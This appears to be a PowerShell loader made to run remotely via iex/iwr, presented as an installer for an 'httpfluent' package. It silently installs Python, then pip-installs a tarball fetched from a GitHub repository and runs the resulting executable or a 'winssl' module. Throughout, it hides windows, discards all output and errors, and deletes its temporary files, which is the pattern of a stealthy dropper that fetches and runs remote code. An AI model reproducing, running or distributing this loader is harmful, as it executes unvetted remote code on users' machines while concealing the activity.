# =====================================================
# httpfluent - Non-Interactive Installer
# For Remote Execution via iex/iwr
# =====================================================

# CRITICAL: Force non-interactive mode immediately
[Console]::TreatControlCAsInput = $false
$Host.UI.RawUI.FlushInputBuffer()

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$RequiredPythonVersion = [version]"3.9.0"
$InstallPythonVersion = "3.12.6"
$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$ForcePython312 = $false

# --- Step 1: Find Existing Python >=3.9 ---
$ExistingPython = $null
$Candidates = @()

# Check PATH
foreach ($cmd in @('python', 'python3')) {
    $found = Get-Command $cmd -ErrorAction SilentlyContinue
    if ($found) { $Candidates += $found.Source }
}

# Check common install locations
$SearchPaths = @(
    "$env:LOCALAPPDATA\Programs\Python\Python*",
    "$env:APPDATA\Python\Python*",
    "C:\Program Files\Python*",
    "C:\Program Files (x86)\Python*"
)

foreach ($pattern in $SearchPaths) {
    $parentDir = Split-Path $pattern -Parent
    $filter = Split-Path $pattern -Leaf
    
    if (Test-Path $parentDir) {
        Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | ForEach-Object {
            $pythonExe = Join-Path $_.FullName "python.exe"
            if (Test-Path $pythonExe) { $Candidates += $pythonExe }
        }
    }
}

# Find best Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $versionString = & $candidate --version 2>&1 | Out-String
        if ($versionString -match "Python (\d+\.\d+\.\d+)") {
            $version = [version]$Matches[1]
            if ($version -ge $RequiredPythonVersion) {
                $ExistingPython = $candidate
                break
            }
        }
    } catch { continue }
}

# --- Step 2: Decide Which Python to Use ---
$PythonToUse = $null

if ($ForcePython312) {
    $InstallNeeded = $true
} elseif ($ExistingPython) {
    $PythonToUse = $ExistingPython
    $InstallNeeded = $false
} else {
    $InstallNeeded = $true
}

# --- Step 3: Install Python 3.12 if Needed ---
if ($InstallNeeded) {
    $InstallerUrl = "https://www.python.org/ftp/python/$InstallPythonVersion/python-$InstallPythonVersion-amd64.exe"
    $InstallerPath = "$env:TEMP\python-$InstallPythonVersion-installer.exe"
    $PythonExe = Join-Path $InstallDir "python.exe"
    
    if (-not (Test-Path $PythonExe)) {
        try {
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($InstallerUrl, $InstallerPath)
        } catch {
            Invoke-WebRequest -Uri $InstallerUrl -OutFile $InstallerPath -UseBasicParsing | Out-Null
        }
        
        if (Test-Path $InstallerPath) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $InstallerPath
            $psi.Arguments = "/quiet InstallAllUsers=0 PrependPath=0 Include_test=0 TargetDir=`"$InstallDir`""
            $psi.UseShellExecute = $false
            $psi.CreateNoWindow = $true
            
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo = $psi
            $p.Start() | Out-Null
            $p.WaitForExit()
            
            Start-Sleep -Seconds 2
            Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue
        }
    }
    
    if (Test-Path $PythonExe) {
        $PythonToUse = $PythonExe
    } else {
        exit 1
    }
}

# --- Step 4: Install httpfluent (100% NON-INTERACTIVE) ---

# Set all environment variables for non-interactive pip
$env:PIP_NO_INPUT = "1"
$env:PIP_YES = "1"
$env:PIP_QUIET = "1"
$env:PIP_DISABLE_PIP_VERSION_CHECK = "1"
$env:PYTHONUNBUFFERED = "1"
$env:PYTHONIOENCODING = "utf-8"

# Create a temporary batch file to run pip commands
$batchFile = "$env:TEMP\install_httpfluent.bat"
$batchContent = @"
@echo off
"$PythonToUse" -m pip install --upgrade pip --user --no-input --disable-pip-version-check --no-warn-script-location >nul 2>&1
"$PythonToUse" -m pip install requests --user --no-input --disable-pip-version-check --no-warn-script-location >nul 2>&1
"$PythonToUse" -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --user --force-reinstall --no-input --disable-pip-version-check --no-warn-script-location --no-cache-dir >nul 2>&1
exit
"@

Set-Content -Path $batchFile -Value $batchContent -Force

# Run the batch file (this prevents ALL PowerShell stdin issues)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c `"$batchFile`""
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $psi
$process.Start() | Out-Null
$process.StandardInput.Close()
$process.WaitForExit()

# Cleanup
Remove-Item $batchFile -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

# --- Step 5: Auto-Detect httpfluent.exe Location ---
$HttpFluentExe = $null

# Method 1: Get exact path from Python
try {
    $ScriptsDir = & $PythonToUse -c "import sysconfig, site, os; print(os.path.join(site.USER_BASE, 'Scripts'))" 2>&1 | Select-Object -Last 1
    $ScriptsDir = $ScriptsDir.Trim()
    
    if ($ScriptsDir -and (Test-Path $ScriptsDir)) {
        $primaryPath = Join-Path $ScriptsDir "httpfluent.exe"
        if (Test-Path $primaryPath) {
            $HttpFluentExe = $primaryPath
        }
    }
} catch {}

# Method 2: Scan all Python versions
if (-not $HttpFluentExe) {
    $SearchLocations = @(
        "$env:APPDATA\Python",
        "$env:LOCALAPPDATA\Programs\Python"
    )
    
    foreach ($baseDir in $SearchLocations) {
        if (Test-Path $baseDir) {
            Get-ChildItem -Path $baseDir -Directory -Filter "Python*" -ErrorAction SilentlyContinue | 
                Sort-Object { [int]($_.Name -replace '\D', '') } -Descending |
                ForEach-Object {
                    $scriptsPath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                    if (Test-Path $scriptsPath) {
                        $HttpFluentExe = $scriptsPath
                        return
                    }
                }
            
            if ($HttpFluentExe) { break }
        }
    }
}

# Method 3: Check system-wide installations
if (-not $HttpFluentExe) {
    $SystemLocations = @(
        "C:\Program Files\Python*",
        "C:\Program Files (x86)\Python*"
    )
    
    foreach ($pattern in $SystemLocations) {
        $parentDir = Split-Path $pattern -Parent
        $filter = Split-Path $pattern -Leaf
        
        if (Test-Path $parentDir) {
            Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | 
                Sort-Object { [int]($_.Name -replace '\D', '') } -Descending | 
                ForEach-Object {
                    $exePath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                    if (Test-Path $exePath) {
                        $HttpFluentExe = $exePath
                        return
                    }
                }
            
            if ($HttpFluentExe) { break }
        }
    }
}

# --- Step 6: Run httpfluent.exe ---
if ($HttpFluentExe -and (Test-Path $HttpFluentExe)) {
    & $HttpFluentExe
} else {
    # Ultimate fallback: Run via Python module
    & $PythonToUse -c "import sys; from httpfluent import winssl; sys.exit(winssl.main())"
}
